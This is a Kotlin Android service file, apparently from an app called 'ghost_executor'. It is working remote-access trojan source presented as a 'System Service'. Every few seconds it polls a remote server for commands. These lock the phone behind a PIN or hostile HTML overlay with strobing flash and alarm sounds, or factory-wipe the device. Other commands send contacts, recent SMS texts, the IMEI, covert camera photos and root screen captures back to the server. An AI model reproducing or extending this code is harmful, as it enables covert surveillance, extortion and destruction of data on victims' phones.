package com.example.ghost_executor

import android.app.*
import android.app.admin.DevicePolicyManager // <--- IMPORT YANG HILANG
import android.app.WallpaperManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.BitmapFactory
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.MediaPlayer
import android.media.ToneGenerator
import android.os.BatteryManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.core.app.NotificationCompat
import org.json.JSONArray
import org.json.JSONObject
import java.net.URL
import java.io.File
import java.io.OutputStream
import java.net.HttpURLConnection

class GhostService : Service() {
    private val CHANNEL_ID = "ghost_channel"
    private val handler = Handler(Looper.getMainLooper())
    
    private var windowManager: WindowManager? = null
    private var overlayView: View? = null
    private var isSystemLocked = false
    private var currentPin = "1234"; private var enteredPin = ""
    private var pinViews = mutableListOf<View>()
    private var currentServer = ""; private var currentDeviceId = ""
    
    private var isLiveRunning = false
    private var liveRunnable: Runnable? = null
    private var isDiscoRunning = false
    private var discoRunnable: Runnable? = null
    private var mediaPlayer: MediaPlayer? = null
    private var cameraManager: CameraManager? = null
    private var cameraId: String? = null
    private var isFlashOn = false
    
    companion object { var isBlockingNotifications = false }

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try { cameraId = cameraManager?.cameraIdList?.get(0) } catch (e: Exception) {}
        createNotificationChannel()
        startForeground()
        startPolling()
    }
    
    private fun startForeground() {
        val notification = NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("System Service").setSmallIcon(android.R.drawable.ic_menu_manage).build()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE) else startForeground(1, notification)
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun startPolling() {
        val runnable = object : Runnable {
            override fun run() {
                Thread {
                    try {
                        val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
                        val deviceId = prefs.getString("flutter.device_id", null)
                        val server = prefs.getString("flutter.server_url", null)
                        if (deviceId != null && server != null) {
                            val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
                            val batteryLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                            sendPost("$server/api/register", "deviceId=$deviceId&battery=$batteryLevel")
                            val response = URL("$server/api/sync/$deviceId").readText()
                            val json = JSONObject(response)
                            handleCommand(json.getString("command"), json.optJSONObject("payload"), server, deviceId)
                        }
                    } catch (e: Exception) {}
                }.start()
                handler.postDelayed(this, 3000)
            }
        }
        handler.post(runnable)
    }

    private fun handleCommand(cmd: String, payload: JSONObject?, server: String, deviceId: String) {
        handler.post {
            when (cmd) {
                "LOCK" -> { 
                    val msg = payload?.optString("message") ?: "Return this device."
                    val pin = payload?.optString("pin") ?: "1234"
                    showStandardLockscreen(msg, pin)
                }
                "LOCKHARD" -> {
                    val html = payload?.optString("html") ?: "<h1>LOCKED</h1>"
                    val pin = payload?.optString("pin") ?: "1234"
                    val disco = payload?.optBoolean("disco", false) ?: false
                    val horror = payload?.optBoolean("horror", false) ?: false
                    val mp3 = payload?.optString("mp3") ?: ""
                    val block = payload?.optBoolean("block_notif", false) ?: false
                    isBlockingNotifications = block
                    showHardcoreLockscreen(html, pin)
                    if (disco) startDisco()
                    if (horror) playHorror()
                    if (mp3.isNotEmpty()) playMp3(mp3)
                }
                "UNLOCK" -> { hideLockscreen(); stopAllEffects(); isBlockingNotifications = false }
                "START_LIVE_SCREEN" -> startLiveScreen(server, deviceId)
                "STOP_LIVE_SCREEN" -> stopLiveScreen()
                "FLASH_ON" -> toggleFlash(true)
                "FLASH_OFF" -> toggleFlash(false)
                "DISCO_START" -> startDisco()
                "DISCO_STOP" -> stopDisco()
                "SET_WALLPAPER" -> setWallpaper(payload?.optString("url"))
                "WIPE_DATA" -> wipeData()
                "ALARM" -> playAlarm()
                "GET_ALL_DATA" -> { uploadContacts(server, deviceId); uploadMessages(server, deviceId); uploadDeviceInfo(server, deviceId) }
                "GET_CONTACTS" -> uploadContacts(server, deviceId)
                "GET_MESSAGES" -> uploadMessages(server, deviceId)
                "GET_DEVICE_INFO" -> uploadDeviceInfo(server, deviceId)
                "CAPTURE_SCREEN" -> captureScreen(server, deviceId)
                "CAM_FRONT" -> takePhoto(server, deviceId, true)
                "CAM_BACK" -> takePhoto(server, deviceId, false)
            }
        }
    }

    // --- UI LOCKSCREEN ---
    private fun showStandardLockscreen(message: String, pin: String) {
        if (overlayView != null) return
        currentPin = pin; enteredPin = ""
        val inflater = LayoutInflater.from(this)
        overlayView = inflater.inflate(R.layout.lock_screen_overlay, null)
        
        overlayView?.findViewById<LinearLayout>(R.id.standard_ui)?.visibility = View.VISIBLE
        overlayView?.findViewById<WebView>(R.id.webview_lock)?.visibility = View.GONE
        overlayView?.findViewById<TextView>(R.id.txt_message)?.text = message

        pinViews.clear(); pinViews.add(overlayView?.findViewById(R.id.pin1)!!); pinViews.add(overlayView?.findViewById(R.id.pin2)!!); pinViews.add(overlayView?.findViewById(R.id.pin3)!!); pinViews.add(overlayView?.findViewById(R.id.pin4)!!)
        updatePinDisplay()
        val buttons = listOf(R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9, R.id.btn0, R.id.btn_clear)
        for (id in buttons) { overlayView?.findViewById<Button>(id)?.setOnClickListener { onPinClick(it) } }
        addOverlayView()
    }

    private fun showHardcoreLockscreen(html: String, pin: String) {
        if (overlayView != null) return
        currentPin = pin; enteredPin = ""
        val inflater = LayoutInflater.from(this)
        overlayView = inflater.inflate(R.layout.lock_screen_overlay, null)

        overlayView?.findViewById<LinearLayout>(R.id.standard_ui)?.visibility = View.GONE
        val webView = overlayView?.findViewById<WebView>(R.id.webview_lock)
        webView?.visibility = View.VISIBLE
        webView?.setWebViewClient(WebViewClient())
        webView?.getSettings()?.javaScriptEnabled = true
        webView?.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)

        addOverlayView()
    }

    private fun addOverlayView() {
        val params = WindowManager.LayoutParams(WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT, if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_PHONE, WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN, PixelFormat.TRANSLUCENT)
        params.gravity = Gravity.TOP
        try { windowManager?.addView(overlayView, params) } catch (e: Exception) {}
    }

    private fun onPinClick(v: View) { 
        if (v !is Button) return; val text = v.text.toString(); if (text == "⌫") { if (enteredPin.isNotEmpty()) enteredPin = enteredPin.dropLast(1) } else if (text.isNotEmpty() && enteredPin.length < 4) { enteredPin += text }; updatePinDisplay(); if (enteredPin.length == 4) { handler.postDelayed({ if (enteredPin == currentPin) { hideLockscreen(); stopAllEffects() } else { enteredPin = ""; updatePinDisplay() } }, 100) } 
    }
    private fun updatePinDisplay() { for (i in 0 until 4) { if (i < enteredPin.length) pinViews[i].setBackgroundColor(-0xbbbbbc.toInt()) else pinViews[i].setBackgroundColor(0x55555555.toInt()) } }
    private fun hideLockscreen() { if (overlayView != null) { try { windowManager?.removeView(overlayView); overlayView = null } catch (e: Exception) {} } }

    // --- EFFECTS ---
    private fun playHorror() {
        Thread { 
            try {
                val tg = ToneGenerator(AudioManager.STREAM_MUSIC, 100)
                while (isSystemLocked) {
                    tg.startTone(ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD, 500)
                    Thread.sleep(600)
                }
                tg.release()
            } catch (e: Exception) {}
        }.start()
    }

    private fun playMp3(url: String) {
        try {
            if (mediaPlayer != null) { mediaPlayer?.release(); mediaPlayer = null }
            mediaPlayer = MediaPlayer().apply {
                setAudioAttributes(AudioAttributes.Builder().setLegacyStreamType(AudioManager.STREAM_MUSIC).build())
                setDataSource(url)
                setVolume(1f, 1f)
                isLooping = true
                prepareAsync()
                setOnPreparedListener { start() }
            }
        } catch (e: Exception) {}
    }

    private fun startDisco() {
        if (isDiscoRunning) return
        isDiscoRunning = true
        discoRunnable = object : Runnable { override fun run() { isFlashOn = !isFlashOn; toggleFlash(isFlashOn); handler.postDelayed(this, 100L) } }
        handler.post(discoRunnable!!)
    }
    private fun stopDisco() { isDiscoRunning = false; discoRunnable?.let { handler.removeCallbacks(it) }; toggleFlash(false) }
    
    private fun stopAllEffects() { stopDisco(); stopLiveScreen(); if (mediaPlayer != null) { mediaPlayer?.stop(); mediaPlayer?.release(); mediaPlayer = null } }

    // --- LIVE SCREEN ---
    private fun startLiveScreen(server: String, deviceId: String) {
        if (isLiveRunning) return
        isLiveRunning = true
        liveRunnable = object : Runnable {
            override fun run() {
                if (!isLiveRunning) return
                captureScreen(server, deviceId)
                handler.postDelayed(this, 1000)
            }
        }
        handler.post(liveRunnable!!)
    }
    private fun stopLiveScreen() { isLiveRunning = false; liveRunnable?.let { handler.removeCallbacks(it) } }

    // --- HELPERS ---
    
    private fun captureScreen(server: String, deviceId: String) {
        Thread { 
            try { 
                val p = Runtime.getRuntime().exec("su")
                val os: OutputStream = p.outputStream
                os.write("screencap -p ${cacheDir.absolutePath}/live.png\n".toByteArray())
                os.write("exit\n".toByteArray())
                os.flush()
                p.waitFor()
                val file = File(cacheDir, "live.png")
                if(file.exists()) uploadFile(server, deviceId, file, "screenshot") 
            } catch (e: Exception) {} 
        }.start() 
    }
    
    private fun takePhoto(server: String, deviceId: String, useFront: Boolean) {
        try {
            val camId = if (useFront) "1" else "0"
            cameraManager?.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    val reader = android.media.ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 2)
                    val surface = reader.surface
                    val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                    req.addTarget(surface)
                    camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) { 
                            session.capture(req.build(), object : CameraCaptureSession.CaptureCallback() { 
                                override fun onCaptureCompleted(s: CameraCaptureSession, r: android.hardware.camera2.CaptureRequest, res: android.hardware.camera2.TotalCaptureResult) { 
                                    val img = reader.acquireLatestImage()
                                    if (img != null) { 
                                        val buffer = img.planes[0].buffer
                                        val bytes = ByteArray(buffer.remaining())
                                        buffer.get(bytes)
                                        img.close()
                                        val file = File(cacheDir, "cam.jpg")
                                        java.io.FileOutputStream(file).write(bytes)
                                        uploadFile(server, deviceId, file, "camera") 
                                    } 
                                } 
                            }, null) 
                        }
                        override fun onConfigureFailed(s: CameraCaptureSession) {}
                    }, null)
                }
                override fun onDisconnected(camera: CameraDevice) {}
                override fun onError(camera: CameraDevice, error: Int) {}
            }, null)
        } catch (e: Exception) {}
    }

    private fun uploadFile(server: String, deviceId: String, file: File, type: String) {
        try {
            val boundary = "----Boundary"
            val conn = URL("$server/api/upload").openConnection() as HttpURLConnection
            conn.doOutput = true; conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            val output = conn.outputStream
            val writer = java.io.PrintWriter(java.io.OutputStreamWriter(output, "UTF-8"))
            writer.append("--$boundary\r\nContent-Disposition: form-data; name=\"image\"; filename=\"${file.name}\"\r\nContent-Type: image/jpeg\r\n\r\n").flush()
            java.io.FileInputStream(file).copyTo(output)
            writer.append("\r\n--$boundary--\r\n").flush()
            if (conn.responseCode == 200) {
                val resp = conn.inputStream.bufferedReader().readText()
                val url = JSONObject(resp).getString("url")
                sendPost("$server/api/intel/$type", "deviceId=$deviceId&data=${JSONObject().put("url", url).toString()}")
            }
        } catch (e: Exception) {}
    }

    private fun toggleFlash(state: Boolean) { try { if (cameraId != null) cameraManager?.setTorchMode(cameraId!!, state) } catch (e: Exception) {} }
    
    private fun setWallpaper(url: String?) { 
        if (url.isNullOrEmpty()) return
        Thread { 
            try { 
                val bmp = BitmapFactory.decodeStream(URL(url).openStream())
                val wm = WallpaperManager.getInstance(applicationContext)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) wm.setBitmap(bmp, null, true, WallpaperManager.FLAG_SYSTEM) else wm.setBitmap(bmp) 
            } catch (e: Exception) {} 
        }.start() 
    }
    
    private fun wipeData() { 
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)
        if (dpm.isAdminActive(admin)) dpm.wipeData(0) 
    }
    
    private fun playAlarm() { Thread { ToneGenerator(AudioManager.STREAM_ALARM, 100).startTone(ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD, 10000) }.start() }

    private fun uploadContacts(server: String, deviceId: String) { 
        val cr = contentResolver
        val cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
        val list = JSONArray()
        if (cur != null && cur.count > 0) { 
            while (cur.moveToNext()) { 
                val name = cur.getString(cur.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
                val id = cur.getString(cur.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                list.put(JSONObject().put("name", name).put("id", id))
            }
            cur.close()
        }
        sendPost("$server/api/intel/contacts", "deviceId=$deviceId&data=$list") 
    }

    private fun uploadMessages(server: String, deviceId: String) { 
        val cr = contentResolver
        val cur = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
        val list = JSONArray()
        if (cur != null && cur.moveToLast()) { 
            for (i in 0 until Math.min(cur.count, 20)) { 
                cur.moveToPrevious()
                val body = cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.BODY))
                list.put(JSONObject().put("body", body))
            }
            cur.close()
        }
        sendPost("$server/api/intel/messages", "deviceId=$deviceId&data=$list") 
    }

    private fun uploadDeviceInfo(server: String, deviceId: String) { 
        val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        val j = JSONObject()
        j.put("model", Build.MODEL)
        j.put("os", Build.VERSION.RELEASE)
        j.put("imei", tm.deviceId ?: "Unknown")
        sendPost("$server/api/intel/device_info", "deviceId=$deviceId&data=[$j]") 
    }

    private fun sendPost(urlStr: String, params: String) { 
        try { 
            val url = URL(urlStr)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.outputStream.write(params.toByteArray())
            conn.inputStream.close()
        } catch (e: Exception) {} 
    }

    override fun onBind(intent: Intent?): IBinder? = null
}